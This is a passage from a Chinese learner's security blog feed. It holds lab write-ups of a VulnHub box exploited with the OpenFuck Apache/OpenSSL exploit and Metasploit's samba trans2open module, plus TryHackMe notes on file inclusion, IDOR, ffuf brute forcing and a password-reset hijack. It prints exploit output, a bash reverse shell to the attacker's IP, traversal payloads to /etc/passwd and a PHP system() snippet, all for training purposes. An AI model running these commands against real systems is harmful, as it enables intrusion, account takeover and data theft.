class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(venv)─(root㉿kali)-[~/Desktop/vulnhub]<br>└─<span class="hljs-comment"># ./47080   </span><br><br>*******************************************************************<br>* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *<br>*******************************************************************<br>* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *<br>* <span class="hljs-comment">#hackarena  irc.brasnet.org                                     *</span><br>* TNX Xanthic USG <span class="hljs-comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span><br>* <span class="hljs-comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br>* <span class="hljs-comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br>*******************************************************************<br><br>: Usage: ./47080 target box [port] [-c N]<br><br>  target - supported box eg: 0x00<br>  box - hostname or IP address<br>  port - port <span class="hljs-keyword">for</span> ssl connection<br>  -c open N connections. (use range 40-50 <span class="hljs-keyword">if</span> u dont know)<br>  <br><br>  Supported OffSet:<br>        0x00 - Caldera OpenLinux (apache-1.3.26)<br>        0x01 - Cobalt Sun 6.0 (apache-1.3.12)<br>        0x02 - Cobalt Sun 6.0 (apache-1.3.20)<br>        0x03 - Cobalt Sun x (apache-1.3.26)<br>        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)<br>        0x05 - Conectiva 4 (apache-1.3.6)<br>        0x06 - Conectiva 4.1 (apache-1.3.9)<br>        0x07 - Conectiva 6 (apache-1.3.14)<br>        0x08 - Conectiva 7 (apache-1.3.12)<br>        0x09 - Conectiva 7 (apache-1.3.19)<br>        0x0a - Conectiva 7/8 (apache-1.3.26)<br>        0x0b - Conectiva 8 (apache-1.3.22)<br>        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)<br>        0x0d - Debian GNU Linux (apache_1.3.19-1)<br>        0x0e - Debian GNU Linux (apache_1.3.22-2)<br>        0x0f - Debian GNU Linux (apache-1.3.22-2.1)<br>        0x10 - Debian GNU Linux (apache-1.3.22-5)<br>        0x11 - Debian GNU Linux (apache_1.3.23-1)<br>        0x12 - Debian GNU Linux (apache_1.3.24-2.1)<br>        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)<br>        0x14 - Debian GNU Linux (apache_1.3.24-3)<br>        0x15 - Debian GNU Linux (apache-1.3.26-1)<br>        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)<br>        0x17 - Debian GNU Linux (apache-1.3.27)<br>        0x18 - FreeBSD (apache-1.3.9)<br>        0x19 - FreeBSD (apache-1.3.11)<br>        0x1a - FreeBSD (apache-1.3.12.1.40)<br>        0x1b - FreeBSD (apache-1.3.12.1.40)<br>        0x1c - FreeBSD (apache-1.3.12.1.40)<br>        0x1d - FreeBSD (apache-1.3.12.1.40_1)<br>        0x1e - FreeBSD (apache-1.3.12)<br>        0x1f - FreeBSD (apache-1.3.14)<br>        0x20 - FreeBSD (apache-1.3.14)<br>        0x21 - FreeBSD (apache-1.3.14)<br>        0x22 - FreeBSD (apache-1.3.14)<br>        0x23 - FreeBSD (apache-1.3.14)<br>        0x24 - FreeBSD (apache-1.3.17_1)<br>        0x25 - FreeBSD (apache-1.3.19)<br>        0x26 - FreeBSD (apache-1.3.19_1)<br>        0x27 - FreeBSD (apache-1.3.20)<br>        0x28 - FreeBSD (apache-1.3.20)<br>        0x29 - FreeBSD (apache-1.3.20+2.8.4)<br>        0x2a - FreeBSD (apache-1.3.20_1)<br>        0x2b - FreeBSD (apache-1.3.22)<br>        0x2c - FreeBSD (apache-1.3.22_7)<br>        0x2d - FreeBSD (apache_fp-1.3.23)<br>        0x2e - FreeBSD (apache-1.3.24_7)<br>        0x2f - FreeBSD (apache-1.3.24+2.8.8)<br>        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)<br>        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)<br>        0x32 - FreeBSD (apache-1.3.27)<br>        0x33 - Gentoo Linux (apache-1.3.24-r2)<br>        0x34 - Linux Generic (apache-1.3.14)<br>        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)<br>        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)<br>        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)<br>        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)<br>        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2<br>        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)<br>        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)<br>        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)<br>        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)<br>        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)<br>        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)<br>        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)<br>        0x41 - Mandrake Linux 8.2 <span class="hljs-comment">#2 (apache-1.3.23-4)</span><br>        0x42 - Mandrake Linux 8.2 (apache-1.3.24)<br>        0x43 - Mandrake Linux 9 (apache-1.3.26)<br>        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)<br>        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)<br>        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)<br>        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)<br>        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)<br>        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)<br>        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)<br>        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)<br>        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)<br>        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)<br>        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)<br>        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)<br>        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)<br>        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)<br>        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1<br>        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2<br>        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)<br>        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)<br>        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1<br>        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2<br>        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3<br>        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1<br>        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2<br>        0x5b - Redhat Linux 7.x (apache-1.3.22)<br>        0x5c - RedHat Linux 7.x (apache-1.3.26-1)<br>        0x5d - RedHat Linux 7.x (apache-1.3.27)<br>        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1<br>        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2<br>        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)<br>        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)<br>        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)<br>        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)<br>        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1<br>        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2<br>        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)<br>        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)<br>        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)<br>        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)<br>        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1<br>        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2<br>        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)<br>        0x6d - RedHat Linux 7.2 (apache-1.3.24)<br>        0x6e - RedHat Linux 7.2 (apache-1.3.26)<br>        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)<br>        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1<br>        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2<br>        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)<br>        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1<br>        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2<br>        0x75 - RedHat Linux 7.3 (apache-1.3.27)<br>        0x76 - RedHat Linux 8.0 (apache-1.3.27)<br>        0x77 - RedHat Linux 8.0-second (apache-1.3.27)<br>        0x78 - RedHat Linux 8.0 (apache-2.0.40)<br>        0x79 - Slackware Linux 4.0 (apache-1.3.6)<br>        0x7a - Slackware Linux 7.0 (apache-1.3.9)<br>        0x7b - Slackware Linux 7.0 (apache-1.3.26)<br>        0x7c - Slackware 7.0  (apache-1.3.26)2<br>        0x7d - Slackware Linux 7.1 (apache-1.3.12)<br>        0x7e - Slackware Linux 8.0 (apache-1.3.20)<br>        0x7f - Slackware Linux 8.1 (apache-1.3.24)<br>        0x80 - Slackware Linux 8.1 (apache-1.3.26)<br>        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)<br>        0x82 - Slackware Linux (apache-1.3.27)<br>        0x83 - SuSE Linux 7.0 (apache-1.3.12)<br>        0x84 - SuSE Linux 7.1 (apache-1.3.17)<br>        0x85 - SuSE Linux 7.2 (apache-1.3.19)<br>        0x86 - SuSE Linux 7.3 (apache-1.3.20)<br>        0x87 - SuSE Linux 8.0 (apache-1.3.23)<br>        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)<br>        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)<br>        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)<br><br>Fuck to all guys <span class="hljs-built_in">who</span> like use lamah ddos. Read SRC to have no surprise<br></code></pre></td></tr></table></figure><p>这里给了使用说明,<br><code>./47080 版本号 ip/域名 端口号 延迟</code><br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823114242.png">这里先找到对应版本号,分别是0×6a和0×6b可用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1<br>0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2<br></code></pre></td></tr></table></figure><p>所以脚本执行就是<code>./47080 0×6a 192.168.49.129 -c 40</code></p><p>a失败,b成功,但是是apache而不是root,还得提权<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823123517.png"></p><p>这里不是root用户,提示是缺少文件了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Unable to establish SSL connection.<br><br>Unable to establish SSL connection.<br>gcc: ptrace-kmod.c: No such file or directory<br>//ptrace-kmod就是要用的但缺少的脚本<br>gcc: No input files<br><span class="hljs-built_in">rm</span>: cannot remove `ptrace-kmod.c<span class="hljs-string">&#x27;: No such file or directory</span><br><span class="hljs-string">bash: ./exploit: No such file or directory</span><br></code></pre></td></tr></table></figure><p>所以就要下载对应的文件,这里先把47080.c给拿到本机来检查一下(刚好可以用昨天学的python http传文件 8000端口)</p><p>ctrl F查找</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823124007.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823135906.png"></p><p>kali能下,但是靶机下不下来,那就传过去,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget 192.168.49.130:8000/ptrace-kmod.c<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823124532.png">成功下下来了<br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823125105.png">ok,root权限到手,之前的原因是,那个cpp脚本会自动下载对应的库(应该是,或者说别的依赖)并进行编译,但是那边网络连接不了,下不下来那个文件,那我们就自己下下来并传上去,然后就ok了</p><p>passwd,改一下密码<br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823125355.png"><br>可以进入了,这里感觉其实已经结束了,但是接着跟着教程走学思路,接下来来个反弹shell</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">//kali<br>nc -lvvp 1234<br>//netcat l 监听端口 vv(v也可以)详细信息 p 1234  kali开放的端口号<br>//靶机,这里的130是kali的ip<br>bash -i &gt;&amp;  /dev/tcp/192.168.49.130/1234 0&gt;&amp;1<br>//bash -i是可交互式命令<br>// &gt;&amp; /dev/tcp/192.168.49.130/1234 前面的&gt;是把bash的交互的流传到后面的文件保存,&amp;是类似指定文件的符号? dev/tcp/ip/port是固定模式,就是以tcp的方式进行连接<br>// 0&gt;&amp;1  0是标准输入(键盘敲的内容),传到1,1是标准输出,即屏幕能看到的内容就是1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823131811.png"><br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823130545.png">连接成功</p><h2 id="samba路线"><a href="#samba路线" class="headerlink" title="samba路线"></a>samba路线</h2><p>139端口</p><h3 id="探查版本"><a href="#探查版本" class="headerlink" title="探查版本"></a>探查版本</h3><p>没思路,视频说开msf能查,那就开吧,msfconsole启动<br>SMB（Server Message Block）是一种网络协议，用于在计算机之间共享文件、打印机和其他资源。它最初由微软开发，后来成为了一种广泛使用的网络协议，用于在本地网络中实现文件和资源共享。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">search smb<br>//smb最常用的是139和445端口<br>//msf的终端搜索有点像普通搜索引擎,可以关键字空格关键字这样来实现联合搜搜,这里要查版本,所以搜索<br>search smb version<br>//漏洞使用方式就是 use 名字<br>use auxiliary/scanner/smb/smb_version<br>show options //显示各种选项,这个指令应该是通用的<br><span class="hljs-built_in">set</span> rhost 192.168.49.129 //设置目标<br>run //执行<br><br>msf6 auxiliary(scanner/smb/smb_version) &gt; run<br><br>[*] 192.168.49.129:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)<br>[*] 192.168.49.129:139    -   Host could not be identified: Unix (Samba 2.2.1a)<br>[*] 192.168.49.129:       - Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed<br><br>//拿到版本号2.2.1a<br>msf6 &gt; search smb 2.2.x<br>[-] No results from search<br>msf6 &gt; search samba 2.2.x<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                              Disclosure Date  Rank     Check  Description</span><br>   -  ----                              ---------------  ----     -----  -----------<br>   0  exploit/multi/samba/nttrans       2003-04-07       average  No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow<br>   1  exploit/freebsd/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (*BSD x86)<br>   2  exploit/linux/samba/trans2open    2003-04-07       great    No     Samba trans2open Overflow (Linux x86)<br>   3  exploit/osx/samba/trans2open      2003-04-07       great    No     Samba trans2open Overflow (Mac OS X PPC)<br>   4  exploit/solaris/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (Solaris SPARC)<br><br><br>Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/trans2open<br><br><br>//这一步并没有很能看懂,知道139端口,是怎么继续知道smb和samaba这两个名字来继续搜索漏洞的<br>//根据操作系统,选择exploit/linux/samba/trans2open<br>//这里还要设一个payload,这个知识盲区了<br><span class="hljs-built_in">set</span> payload linux/x86/shell_bind_tcp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823133557.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230823135105.png"></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thm.文件包含</title>
    <link href="/2023/08/22/thm-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/08/22/thm-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="本地文件包含-LFI-local-file-inclusion"><a href="#本地文件包含-LFI-local-file-inclusion" class="headerlink" title="本地文件包含 (LFI)(local file inclusion)"></a>本地文件包含 (LFI)(local file inclusion)</h1><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822151216.png"><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822151355.png"><br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822151417.png"><br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822151457.png">看报错,找路径,算上当前目录前面还有四层目录,回退四次找到根目录,进入etc&#x2F;passwd,直接访问会有权限限制,可以%00绕过(本质是截断后续内容),也可以&#x2F;etc&#x2F;passwd&#x2F;.绕过,&#x2F;.就是再次访问当前路径(cd .)因为整个url最后的路径不是passwd,所以绕过了检测<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822151753.png"></p><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>原因是检测到..&#x2F;这样的路径访问并删除,但如果….&#x2F;&#x2F;这样的话,删掉..&#x2F;之后又变成..&#x2F;了</p><h2 id="强制目录包含"><a href="#强制目录包含" class="headerlink" title="强制目录包含"></a>强制目录包含</h2><p>没啥好说的,就是前面的各种操作路径再加上强制需求的路径即可<br>假设强制要求带有thmprofile,那么<br><code>http://10.10.43.220/lab6.php?file=THM-profile/../../../../etc/os-release</code></p><h1 id="远程文件包含-RFI-remote-file-inclusion"><a href="#远程文件包含-RFI-remote-file-inclusion" class="headerlink" title="远程文件包含 (RFI)(remote file inclusion)"></a>远程文件包含 (RFI)(remote file inclusion)</h1><p>类似文件上传漏洞<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230822155510.png"><br>还是做的挺艰难的,这里算是又新学了一点,这里本来只能直接传文字,不能传文件,然后用<code>python3 -m http.server</code>开了一个本地服务器,然后<a href="http://ip/1.txt">http://ip/1.txt</a> 这样就可以上传了<br>这个指令在win的局域网也可以用来传文件,在想要传文件的目录(比如D盘的src目录)打开powershell,<code>python -m http.server</code>,局域网内用户就可以直接访问下载了</p><h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><p>dot-dot-slash attack<br>整个这么高级的名字,实际就是<code>cd ..</code></p><p><code>http://webapp.thm/get.php?file=abc.pdf 这是正常访问时的路径,但可以再abc.pdf前加上 ../ </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http://webapp.thm/get.php?file"><br># 小演练<br><br>折磨了快半个多小时,不小了<br><br>```php<br>&lt;?PHP<br>    echo system(&#x27;hostname&#x27;);  //中间不是反引号,是单引号!hostname类似whoami<br>?&gt;<br>    <br>//eval应该也可以,没试<br>&lt;?php<br>$user_input = $_GET[&#x27;input&#x27;]; // 假设用户输入<br>$command = &quot;echo system(&#x27;hostname&#x27;);&quot;; // 构造要执行的命令<br>eval($command); // 使用 eval() 执行命令<br>?&gt;<br></code></pre></td></tr></table></figure><p>尽量用%00,这个成功率高点,注意报错是什么,有些时候只能post,有些时候只能get,尽量多试几次,还有就是cookie里有身份验证</p>]]></content>
    
    
    <categories>
      
      <category>thm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thm.IDOR</title>
    <link href="/2023/08/22/thm-IDOR/"/>
    <url>/2023/08/22/thm-IDOR/</url>
    
    <content type="html"><![CDATA[<h1 id="我推的IDOR"><a href="#我推的IDOR" class="headerlink" title="我推的IDOR"></a>我推的IDOR</h1><p>OWASP TOP 10 中的越权漏洞</p><p>感觉这个实例很有用的样子</p><p>本质算是路径暴露?比如id&#x3D;1是admin用户,1以后的是普通用户,但在url里直接把id改成1就算idor了</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>创建一个账户,点击my account,打开F12然后刷新,可以看到<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5d71d3fe747a8c8934564feddfc69f75.png" alt="img"></p><p>看到暴露路径了,&#x2F;api&#x2F;v1&#x2F;customer?id&#x3D;,把id依次改成别的再打开,就可以看到别人的信息了</p><p>如果是id号是一串编码,则可以考虑经过base64编码,比如信息是&#x2F;?info&#x3D;e2lkPTE7dXNlcm5hbWU9YWRtaW59</p><p>然后对这个解码,就是{id&#x3D;1;username&#x3D;admin},把id改成别的,大概就可以越权访问了?</p>]]></content>
    
    
    <categories>
      
      <category>thm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thm.身份验证绕过</title>
    <link href="/2023/08/21/thm-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"/>
    <url>/2023/08/21/thm-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h1><p>感觉这个用burp可能会更好理解一点,thm给的还是ffuf(真强啊这工具)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d <span class="hljs-string">&quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://10.10.90.74/customers/signup -mr <span class="hljs-string">&quot;username already exists&quot;</span><br></code></pre></td></tr></table></figure><p>-w 字典        -x 请求方法,不写-x则默认GET         -H是请求头,这里应用的是<code>Content-Type:</code>的内容,也可以指定别的报文内容(有点类似hackbar),x-www-form-urlencoded是指定url编码,这是常见的post请求的内容,<br>-mr是指定响应返回值,即只有响应用户名已存在的才会被返回,-d是需要用FUZZ替换的内容</p><h1 id="密码暴力破解"><a href="#密码暴力破解" class="headerlink" title="密码暴力破解"></a>密码暴力破解</h1><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821195629.png"></p><p>前面发现的用户名,这里存储到一个文件中用以爆破,<br>-e是允许转义字符存在,&gt;是替换&#x2F;存入全部内容,&gt;&gt;是追加</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821200311.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ffuf -w username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d <span class="hljs-string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://10.10.90.74/customers/login -<span class="hljs-built_in">fc</span> 200<br></code></pre></td></tr></table></figure><p>就还是简单的爆破,跟burp本质没区别,感觉这个了解就行</p><h1 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a><strong>逻辑缺陷</strong></h1><p>这里很简略的提了一下,稍微说了下强比较</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&#x27;http://10.10.253.36/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="hljs-string">&#x27;username=robert&amp;email=attacker@hacker.com&#x27;</span><br></code></pre></td></tr></table></figure><p>前面是重置用户密码的网站,这里是先输入用户邮箱,然后进入到<code>http://10.10.253.36/customers/reset?email=robert%40acmeitsupport.thm</code>这个页面,这时再输入用户名(正常重置密码感觉应该不是这个顺序),这时再用curl访问请求,同时再次提交了一个post请求的内容:email改成我们自己创建的一个账户了,虽然本来系统已经获取了之前的用户邮箱,但这里是用post请求提交的,具有更高的优先级,就会把本来应该发给robert的重置密码的邮箱的消息发送到了hacker的邮箱</p>]]></content>
    
    
    <categories>
      
      <category>thm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thm.网站资源发现</title>
    <link href="/2023/08/21/thm-%E7%BD%91%E7%AB%99%E8%B5%84%E6%BA%90%E5%8F%91%E7%8E%B0/"/>
    <url>/2023/08/21/thm-%E7%BD%91%E7%AB%99%E8%B5%84%E6%BA%90%E5%8F%91%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><p>域名&#x2F;robots.txt</p><p>会写明允许允许访问&#x2F;爬取的内容和不允许的,不允许的就是需要重点看的</p><h1 id="Favicon"><a href="#Favicon" class="headerlink" title="Favicon"></a>Favicon</h1><p>就是网站导航栏上的小图标,我的favicon是个咖啡</p><p><code>curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum</code></p><p>根据哈希值查询favicon信息的网站<code>https://wiki.owasp.org/index.php/OWASP_favicon_database</code></p><p>假设我的网站是example.com</p><p>那么想获取我的网站的favicon该用的指令就是</p><p><code>curl https://example.com/favicon.ico | md5sum</code></p><p>网站都可以通过<code>域名/favicon.ico</code>的方式获取favicon</p><h1 id="sitemap-xml"><a href="#sitemap-xml" class="headerlink" title="sitemap.xml"></a>sitemap.xml</h1><p>能看到子域名和目录等,但可能有的网站不允许访问,有的网站提供的不全,通过sitemap.xml可以了解到一个网站大概的结构</p><h1 id="https响应"><a href="#https响应" class="headerlink" title="https响应"></a>https响应</h1><p>可以通过<code>curl https://example.com -v</code>来查看各种信息,这里甚至能看到域名解析商,比如我的是cf</p><p>wapplayzer其实也可以,更方便点</p><h1 id="查找网站历史内容"><a href="#查找网站历史内容" class="headerlink" title="查找网站历史内容"></a>查找网站历史内容</h1><p>如题</p><p><code>https://archive.org/web/</code></p><h1 id="github-git"><a href="#github-git" class="headerlink" title="github&#x2F;git"></a>github&#x2F;git</h1><p>你在github里甚至能搜到免费的gpt-token</p><h1 id="存储桶-腾讯云COS桶"><a href="#存储桶-腾讯云COS桶" class="headerlink" title="存储桶(腾讯云COS桶?)"></a>存储桶(腾讯云COS桶?)</h1><p>S3 桶</p><p>S3 Buckets 是亚马逊 AWS 提供的一种存储服务，允许人们将文件甚至静态网站内容保存在云中，可通过 HTTP 和 HTTPS 访问。文件所有者可以设置访问权限，使文件公开、私有甚至可写。有时，这些访问权限设置错误，无意中允许访问不应该向公众开放的文件。S3 存储桶的格式是 